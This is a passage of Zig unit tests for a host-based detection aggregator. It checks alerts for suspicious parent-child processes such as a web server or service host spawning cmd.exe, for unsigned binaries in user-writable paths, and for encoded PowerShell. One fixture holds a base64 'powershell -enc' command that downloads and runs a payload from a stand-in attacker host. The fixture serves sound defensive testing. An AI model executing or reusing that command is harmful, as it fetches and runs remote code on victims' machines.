    agg.total_extended_detections = 10;
    agg.total_parent_detections = 5;
    agg.total_cmdline_detections = 3;
    agg.total_injection_detections = 2;
    agg.resetStats();
    try std.testing.expectEqual(@as(u64, 0), agg.total_extended_detections);
    try std.testing.expectEqual(@as(u64, 0), agg.total_parent_detections);
    try std.testing.expectEqual(@as(u64, 0), agg.total_cmdline_detections);
    try std.testing.expectEqual(@as(u64, 0), agg.total_injection_detections);
}

test "EnhancedDetectorAggregator detects svchost -> cmd (T1078 pattern)" {
    var agg = EnhancedDetectorAggregator.init(.{ .enabled = true });

    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 4100,
        .ppid = 4000,
        .integrity = .system,
        .is_signed = true,
    };
    const img = "C:\\Windows\\System32\\cmd.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);

    const parent_img = "C:\\Windows\\System32\\svchost.exe";
    const result = agg.check(ev, parent_img);

    try std.testing.expectEqual(@as(u8, 1), result.count);
    try std.testing.expectEqual(ExtendedSuspicionReason.service_host_spawning_shell, result.reasons[0]);
}

test "End-to-end: T1190 webshell scenario triggers web_server detection" {
    // Simulates the webshell scenario from Ext 2:
    // w3wp.exe spawns cmd.exe (the reverse shell launcher)
    var agg = EnhancedDetectorAggregator.init(.{ .enabled = true });

    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 5100,
        .ppid = 5000,
        .integrity = .system,
        .is_signed = true,
    };
    const img = "C:\\Windows\\System32\\cmd.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);

    const parent_img = "C:\\Windows\\System32\\inetsrv\\w3wp.exe";
    const result = agg.check(ev, parent_img);

    try std.testing.expect(result.count >= 1);
    try std.testing.expectEqual(ExtendedSuspicionReason.web_server_spawning_shell, result.reasons[0]);
}

test "End-to-end: T1059 command-execution triggers encoded_command detection" {
    // Simulates the powershell -enc from command-execution scenario
    var agg = EnhancedDetectorAggregator.init(.{ .enabled = true });

    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 2100,
        .ppid = 2000,
        .integrity = .medium,
        .is_signed = true,
    };
    const img = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);
    const cmdline = "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkACcAKQA=";
    @memcpy(ev.cmdline[0..cmdline.len], cmdline);
    ev.cmdline_len = @intCast(cmdline.len);

    // parent is cmd.exe - not in extended parents list, so only cmdline detection
    const result = agg.check(ev, "C:\\Windows\\System32\\cmd.exe");

    try std.testing.expect(result.count >= 1);
    var found_encoded = false;
    for (result.reasons[0..result.count]) |r| {
        if (r == .encoded_command_payload) found_encoded = true;
    }
    try std.testing.expect(found_encoded);
}

test "End-to-end: T1003 credential dump triggers injection detection" {
    // Simulates the credential-dump scenario: unsigned HIGH process in temp
    var agg = EnhancedDetectorAggregator.init(.{ .enabled = true });

    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 1500,
        .ppid = 4,
        .integrity = .high,
        .is_signed = false,
    };
    const img = "C:\\Users\\Public\\taskhost.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);

    const result = agg.check(ev, null);

    // Should trigger injection detection (unsigned HIGH in user-writable path).
    // Pattern 1 (isInTempFolder + ppid != 0) returns virtual_alloc first;
    // the write_memory branch only triggers when pattern 1 doesn't match.
    try std.testing.expect(result.count >= 1);
    var found_injection = false;
    for (result.reasons[0..result.count]) |r| {
        if (r == .process_injection_virtual_alloc or r == .process_injection_write_memory) {
            found_injection = true;
        }
    }
    try std.testing.expect(found_injection);
}
